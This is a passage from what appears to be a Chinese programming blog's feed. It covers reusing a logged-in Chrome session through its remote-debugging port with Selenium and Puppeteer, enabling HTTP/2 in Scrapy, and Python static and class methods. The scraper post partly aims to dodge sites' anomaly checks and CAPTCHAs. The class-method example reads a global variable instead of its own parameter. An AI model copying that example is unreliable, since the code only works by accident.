selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_experimental_option(<span class="string">"debuggerAddress"</span>, <span class="string">"127.0.0.1:9222"</span>)</span><br><span class="line"><span class="comment"># 注意我把chromedriver文件放到了当前文件夹里面，所以可以这样调用</span></span><br><span class="line"><span class="comment"># 如果你是windows电脑，你需要使用./chromedriver.exe</span></span><br><span class="line">driver = Chrome(<span class="string">'./chromedriver'</span>, options=chrome_options)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">driver.get(<span class="string">'http://exercise.kingname.info/exercise_login_success'</span>)</span><br><span class="line">input(<span class="string">'输入任意内容继续'</span>)</span><br><span class="line">driver.get(<span class="string">'https://www.kingname.info'</span>)</span><br><span class="line">input(<span class="string">'输入任意内容继续'</span>)</span><br><span class="line">driver.get(<span class="string">'http://exercise.kingname.info/exercise_login_success'</span>)</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211216183133.png" alt></p><p>由于使用Selenium的时候，始终操作的都是当前标签页，为了证明确实有效，所以我在示例代码里面，先把爬虫暂停，需要你在终端按下任何键以后，再打开我的博客。接下来，等你确认博客已经打开以后，再回到终端按下任意键，Chrome会再次打开登录成功的页面。</p><p>你还可以试一试把Python程序终止，再重新运行。你会发现代码依然可以接管这个浏览器窗口。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在昨天的文章&lt;a href=&quot;https://mp.weixin.qq.com/s/ZifW2YtB_G2hmf_Es0BAgw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一日一技：爬虫模拟浏览器如何避免重复登录？&lt;/a&gt;中，我讲到了如何使用Puppeteer接管已经运行的Chrome。今天我们来讲讲使用Selenium如何实现这个功能。&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="Selenium" scheme="https://www.kingname.info/tags/Selenium/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：爬虫模拟浏览器如何避免重复登录？</title>
    <link href="https://www.kingname.info/2021/12/23/remote-debug-puppeteer/"/>
    <id>https://www.kingname.info/2021/12/23/remote-debug-puppeteer/</id>
    <published>2021-12-23T02:55:02.000Z</published>
    <updated>2021-12-23T02:56:51.573Z</updated>
    
    <content type="html"><![CDATA[<p>当我们使用模拟浏览器访问一个网站的时候，可能会遇到网站需要登录的情况。我的爬虫练习网站提供了这样一个<a href="http://exercise.kingname.info/exercise_login_success" target="_blank" rel="noopener">登录练习</a>的案例。</p><p>如果你手动用浏览器测试，你会发现这样一个现象：第一次访问的时候，自动跳转到登录页面。输入账号<code>kingname</code>和密码<code>genius</code>以后，可以看到登录成功的页面，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211215170103.png" alt></p><p>现在，你把浏览器关了再打开，然后再次访问这个网址，你会发现浏览器直接就能进入到登录成功的页面，不会再出现登录页面。</p><a id="more"></a><p>我们都知道，这是因为浏览器记住了网站的Cookies，即使关闭了浏览器再打开，这个Cookies依然存在，所以可以绕过登录功能。</p><p>但如果你使用Selenium或者Puppeteer/Pyppeteer，那么情况就不是这样了。当你第一次登录成功了以后，退出程序。第二次重新运行程序的时候，爬虫又要重新登录一次。这个过程一来拖慢了爬虫的运行速度，二来容易让网站检测到你的账号异常——难道自动登录功能失效了？为什么其他人的都正常，他的账号每小时都要重新登录一次？可能是爬虫，发个验证码过去探探虚实。</p><p>同理，还有时候，网站登录会出现很麻烦的验证码，但是一旦登录成功，这个验证码就再也不会出现了。处理这种验证码最简单的办法就是直接人工参与。那么如果爬虫每小时都要运行一次，岂不是每小时都要人来过一次验证码？能不能让爬虫只登录一次，之后就再也不登陆了呢？</p><p>方法有两个。第一个方法，也是大家最直观能想到的方法：登陆成功以后，把Cookies保存下来。下一次要重新登陆的时候直接把这个Cookies设置到浏览器里面可以了。这个方法网上有很多例子，你可以通过关键词“selenium 获取cookies”和“selenium设置cookies”搜索到，我就不再赘述了。</p><p>我们今天要讲的是第二个方法，也是最简单的方法。并且这个方法听起来很弱智：我不关浏览器，它的Cookies不就不会清空了吗？</p><p>但你仔细想一下，根据你之前的经验，当你的爬虫代码退出的时候，是不是浏览器也被自动关闭了？即使因为某种原因，爬虫代码本身崩溃了，浏览器没有关闭，那你第二次启动爬虫的时候，怎么重新连回之前启动的浏览器？</p><p>我们今天要做的，就是把启动浏览器和启动爬虫，这两件事情分开。首先使用某种方法单独启动浏览器，然后再启动爬虫代码，并且让爬虫代码接管这个浏览器并控制它。</p><p>Chrome浏览器是支持远程调试模式的。这个模式打开的情况下，Puppeteer或者Selenium可以通过websocket连上去，进而控制它。</p><p>首先我们来启动Chrome的远程调试端口。你需要找到Chrome的安装位置，在Chrome的地址栏输入<code>chrome://version</code>就能找到Chrome的安装路径，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211215204518.png" alt></p><p>有了这个以后，我们需要执行命令启动支持远程调试功能的Chrome。如果你的电脑是Mac，那么命令是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"</span>  --remote-debugging-port=9222 --no-first-run --no-default-browser-check --user-data-dir=$(mktemp -d -t <span class="string">'chrome-remote_data_dir'</span>)</span><br></pre></td></tr></table></figure><p>注意，由于地址中有空格，所以要把可执行文件的路径用引号抱起来。</p><p>如果你的电脑是Windows，那么就很简单了，执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件路径/chrome.exe --remote-debugging-port=9222</span><br></pre></td></tr></table></figure><p>启动以后如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211215204912.png" alt></p><p>此时，你先不要动这个通过命令启动的Chrome。你先打开普通的浏览器，输入网址：<code>http://127.0.0.1:9222/json/version</code>，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211215205821.png" alt></p><p>记住其中的<code>webSocketDebuggerUrl</code>后面的地址。这就是我们远程链接的地址。</p><p>今天我们以Puppeteer为例，介绍如何连接这个远程的Chrome。</p><p>在连之前，我们首先做一件事情，在通过命令启动的这个Chrome中，打开我们的登录练习页面，然后手动登录它。如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211215205305.png" alt></p><p>然后，我们来写一段Puppeteer的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer-core'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> address = <span class="string">'ws://127.0.0.1:9222/devtools/browser/f6ede2a1-cf7b-4a0d-b0ea-9c0cd24d240d'</span></span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.connect(&#123;</span><br><span class="line">  browserWSEndpoint: address,</span><br><span class="line">&#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">response = <span class="keyword">await</span> page.goto(<span class="string">'http://exercise.kingname.info/exercise_login_success'</span>, &#123; <span class="attr">waitUntil</span>: <span class="string">'load'</span>, <span class="attr">timeout</span>: <span class="number">0</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line">run()</span><br></pre></td></tr></table></figure><p>这段代码最核心的就两行，连接远程的Chrome：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> address = <span class="string">'ws://127.0.0.1:9222/devtools/browser/f6ede2a1-cf7b-4a0d-b0ea-9c0cd24d240d'</span></span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.connect(&#123;</span><br><span class="line">  browserWSEndpoint: address,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211215210106.png" alt></p><p>可以看到，代码控制浏览器打开了一个新的标签页，并且立刻就能打开登录成功后的页面，不需要再次登录。</p><p>大家可以试一试，现在在终端窗口里面按下Ctrl + C把当前的爬虫代码强行关闭，然后再启动一次，你会发现依然是登录以后的页面。</p><p>这样一来，以后遇到需要登录的网站，只需要使用这个远程调试模式，先启动一个支持远程调试的Chrome浏览器，然后手动在浏览器上完成登录操作，接下来爬虫代码就再也不需要考虑登录这个动作了，爬虫可以直接访问登录后的页面。</p><p>你自己测试的过程中，可能会发现标签页越开越多。其实不用担心，这是因为我为了演示登录后的页面，没有关闭当前标签页导致的。你的爬虫执行完操作以后，可以使用<code>await page.close()</code>关闭当前标签页。只要至少保留一个标签页不关闭，那么这个浏览器窗口就可以一直使用。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当我们使用模拟浏览器访问一个网站的时候，可能会遇到网站需要登录的情况。我的爬虫练习网站提供了这样一个&lt;a href=&quot;http://exercise.kingname.info/exercise_login_success&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;登录练习&lt;/a&gt;的案例。&lt;/p&gt;
&lt;p&gt;如果你手动用浏览器测试，你会发现这样一个现象：第一次访问的时候，自动跳转到登录页面。输入账号&lt;code&gt;kingname&lt;/code&gt;和密码&lt;code&gt;genius&lt;/code&gt;以后，可以看到登录成功的页面，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211215170103.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;现在，你把浏览器关了再打开，然后再次访问这个网址，你会发现浏览器直接就能进入到登录成功的页面，不会再出现登录页面。&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="Puppeteer" scheme="https://www.kingname.info/tags/Puppeteer/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：谁说 Scrapy 不能爬 HTTP/2?</title>
    <link href="https://www.kingname.info/2021/10/21/scrapy-http2/"/>
    <id>https://www.kingname.info/2021/10/21/scrapy-http2/</id>
    <published>2021-10-21T13:27:02.000Z</published>
    <updated>2021-10-21T13:28:38.070Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-15-04-09.png" alt></p><p>之前有一位爬虫大佬写了一篇文章，说 HTTP/2协议天然就能防大部分的爬虫。Python 无论是 requests 还是 Scrapy 都不支持 HTTP/2协议。</p><p><a href="https://http2.golang.org/" target="_blank" rel="noopener">Go + HTTP/2</a>这个网站可以检测你是否使用 HTTP/2协议进行请求。当我们直接使用浏览器访问的时候，页面长这样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-14-51-13.png" alt="注意红框中的文字"></p><p>但如果我们直接使用 Scrapy 访问这个页面，并打印源代码，返回的 HTML 长这样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-14-52-26.png" alt="注意红框中的文字"></p><p>这样看起来，似乎Scrapy 确实不支持HTTP/2协议？</p><a id="more"></a><p>但我为什么总是一直强调要读官方文档，不要去搜索一些垃圾博客呢。因为官方文档里面，已经明确告诉你Scrapy 不仅原生支持 HTTP/2，而且只需要改一个配置就可以了：<a href="https://docs.scrapy.org/en/latest/topics/settings.html#download-handlers-base" target="_blank" rel="noopener">Settings — Scrapy 2.5.0 documentation</a>。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-14-55-17.png" alt="更换下载器句柄就可以了"></p><p>请大家注意上图中标红色方框的地方。根据它的描述，我只需要在<code>settings.py</code>文件中，更新下载器句柄（handlers）就可以了。我们来测试一下。把下面这段代码直接复制到 Scrapy 爬虫中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DOWNLOAD_HANDLERS = &#123;</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'scrapy.core.downloader.handlers.http2.H2DownloadHandler'</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-14-57-55.png" alt></p><p>改好以后，重新运行爬虫，打印出来的源代码如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-14-59-26.png" alt></p><p>可以看到，不需要安装任何额外的库。Scrapy 原生就支持 HTTP/2了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-15-04-09.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;之前有一位爬虫大佬写了一篇文章，说 HTTP/2协议天然就能防大部分的爬虫。Python 无论是 requests 还是 Scrapy 都不支持 HTTP/2协议。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://http2.golang.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Go + HTTP/2&lt;/a&gt;这个网站可以检测你是否使用 HTTP/2协议进行请求。当我们直接使用浏览器访问的时候，页面长这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-14-51-13.png&quot; alt=&quot;注意红框中的文字&quot;&gt;&lt;/p&gt;
&lt;p&gt;但如果我们直接使用 Scrapy 访问这个页面，并打印源代码，返回的 HTML 长这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-14-52-26.png&quot; alt=&quot;注意红框中的文字&quot;&gt;&lt;/p&gt;
&lt;p&gt;这样看起来，似乎Scrapy 确实不支持HTTP/2协议？&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="Scrapy" scheme="https://www.kingname.info/tags/Scrapy/"/>
    
      <category term="HTTP/2" scheme="https://www.kingname.info/tags/HTTP-2/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：什么情况使用静态方法和类方法？</title>
    <link href="https://www.kingname.info/2021/10/08/staticmethod-and-classmethod/"/>
    <id>https://www.kingname.info/2021/10/08/staticmethod-and-classmethod/</id>
    <published>2021-10-08T15:08:57.000Z</published>
    <updated>2021-10-08T15:10:12.767Z</updated>
    
    <content type="html"><![CDATA[<p>有同学在知识星球上问我，什么情况下使用静态方法，什么情况下使用类方法。今天我们就来捋一下这两个方法的应用场景。</p><a id="more"></a><p>首先，我们来定义一个普通的类。里面都是普通的方法。普通的方法又叫做实例方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">introduce_myself</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">f'大家好，我叫: <span class="subst">&#123;self.name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_two_string_num</span><span class="params">(self, a, b)</span>:</span></span><br><span class="line">        a_int = int(a)</span><br><span class="line">        b_int = int(b)</span><br><span class="line">        <span class="keyword">return</span> a_int + b_int</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calc_age_after_n_year</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        age = self.add_two_string_num(self.age, n)</span><br><span class="line">        print(<span class="string">f'<span class="subst">&#123;n&#125;</span>年以后，我<span class="subst">&#123;age&#125;</span>岁'</span>)</span><br></pre></td></tr></table></figure><p>这个类运行起来的效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211008184034.png" alt></p><p>大家注意在个类里面的方法<code>add_two_string_num</code>，它接受两个参数，把他们转换为<code>int</code>类型，然后相加并返回结果。这个过程非常简单。但是，它跟People这个类有什么直接关系吗？</p><p>其实这个方法跟这个类没有什么直接关系，我们甚至把它改成函数都可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_two_string_num</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    a_int = int(a)</span><br><span class="line">    b_int = int(b)</span><br><span class="line">    <span class="keyword">return</span> a_int + b_int</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">introduce_myself</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">f'大家好，我叫: <span class="subst">&#123;self.name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calc_age_after_n_year</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        age = add_two_string_num(self.age, n)</span><br><span class="line">        print(<span class="string">f'<span class="subst">&#123;n&#125;</span>年以后，我<span class="subst">&#123;age&#125;</span>岁'</span>)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">kingname = People(<span class="string">'kingname'</span>, <span class="number">20</span>)</span><br><span class="line">kingname.introduce_myself()</span><br><span class="line">kingname.calc_age_after_n_year(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>运行结果跟之前完全一样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211008184448.png" alt></p><p>我们可以说，<code>add_two_string_num</code>函数就是一个<code>工具函数</code>。工具函数接收参数，输出结果。完全不关心谁在调用他，也不关心在哪里调用他。</p><p>但现在有一个比较尴尬的事情，这个函数，只有 <code>People</code>在调用，其它地方都没有调用。单独把它放到其它地方又显得多余，弄成实例方法又浪费了self参数，这个时候，我们就可以用静态方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">introduce_myself</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">f'大家好，我叫: <span class="subst">&#123;self.name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_two_string_num</span><span class="params">(a, b)</span>:</span></span><br><span class="line">        a_int = int(a)</span><br><span class="line">        b_int = int(b)</span><br><span class="line">        <span class="keyword">return</span> a_int + b_int</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calc_age_after_n_year</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        age = People.add_two_string_num(self.age, n)</span><br><span class="line">        print(<span class="string">f'<span class="subst">&#123;n&#125;</span>年以后，我<span class="subst">&#123;age&#125;</span>岁'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kingname = People(<span class="string">'kingname'</span>, <span class="number">20</span>)</span><br><span class="line">kingname.introduce_myself()</span><br><span class="line">kingname.calc_age_after_n_year(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><blockquote><p>一句话总结：静态方法就是某个类专用的工具函数。</p></blockquote><p>说完了静态方法，我们再说说类方法。什么情况下应该使用类方法呢？回答这个问题前，我先返回你一个问题，怎么把<code>People</code>类初始化成一个实例？</p><p>你说这还不简单吗，一行代码就行了啊：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx = People(<span class="string">'xxx'</span>, <span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>注意，这里你在初始化这个类的时候，你是一个一个参数传入进去的。如果你用过顺丰寄送快递，你就会发现，填写收件人的时候，有两种方式，一种方式就像上线这样，一个一个参数填进去。还有一种方式，它给你一个输入框，你把一段包含姓名，地址，手机号的文字粘贴进去，它自动解析。</p><p>那么，如果我现在给你一个字符串：<code>我的名字：青南，我的年龄：20，把它提取出来</code>。你怎么基于这个字符串生成People类的实例？</p><p>这个时候，你可能会这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">content = <span class="string">'我的名字：青南，我的年龄：20，把它提取出来'</span></span><br><span class="line">name = re.search(<span class="string">'名字：(.*?)，'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">age = re.search(<span class="string">'年龄：(\d+)'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">kingname = People(name, age)</span><br></pre></td></tr></table></figure><p>这样做确实可以，但我能不能让People这个类自动识别呢？其实是可以的，有两种方法，一种方法是在<code>__init__</code>里面多加几个参数，然后在初始化的时候，从这几个参数里面解析，这个方法大家都知道，我就不多讲了。我们来讲讲第二个方法，就是使用类方法。</p><p>我们只需要在定义一个类方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">introduce_myself</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">f'大家好，我叫: <span class="subst">&#123;self.name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_two_string_num</span><span class="params">(a, b)</span>:</span></span><br><span class="line">        a_int = int(a)</span><br><span class="line">        b_int = int(b)</span><br><span class="line">        <span class="keyword">return</span> a_int + b_int</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_chinese_string</span><span class="params">(cls, sentence)</span>:</span></span><br><span class="line">        name = re.search(<span class="string">'名字：(.*?)，'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">        age = re.search(<span class="string">'年龄：(\d+)'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> cls(name, age)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calc_age_after_n_year</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        age = People.add_two_string_num(self.age, n)</span><br><span class="line">        print(<span class="string">f'<span class="subst">&#123;n&#125;</span>年以后，我<span class="subst">&#123;age&#125;</span>岁'</span>)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">content = <span class="string">'我的名字：青南，我的年龄：20，把它提取出来'</span></span><br><span class="line">kingname = People.from_chinese_string(content)</span><br><span class="line">kingname.introduce_myself()</span><br><span class="line">kingname.calc_age_after_n_year(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211008190533.png" alt></p><p>类方法使用装饰器<code>@classmethod</code>来装饰，并且它的第一个参数是隐式参数<code>cls</code>。这个参数其实就是<code>People</code>这个类本身。这个隐式参数在我们调用类方法的时候，是不需要传入的。在这个类方法里面，相当于使用<code>People</code>初始化了一个实例，然后把这个实例返回了出去。</p><p>这样做有什么好处呢？好处就在于我们完全不需要修改<code>__init__</code>，那么，也就不需要修改代码里面其它调用了<code>People</code>类的地方。例如现在我又想增加从英文句子里面提取名字和年龄的功能，那么我只需要再添加一个类方法就可以了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">introduce_myself</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">f'大家好，我叫: <span class="subst">&#123;self.name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_two_string_num</span><span class="params">(a, b)</span>:</span></span><br><span class="line">        a_int = int(a)</span><br><span class="line">        b_int = int(b)</span><br><span class="line">        <span class="keyword">return</span> a_int + b_int</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_chinese_string</span><span class="params">(cls, sentence)</span>:</span></span><br><span class="line">        name = re.search(<span class="string">'名字：(.*?)，'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">        age = re.search(<span class="string">'年龄：(\d+)'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> cls(name, age)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span 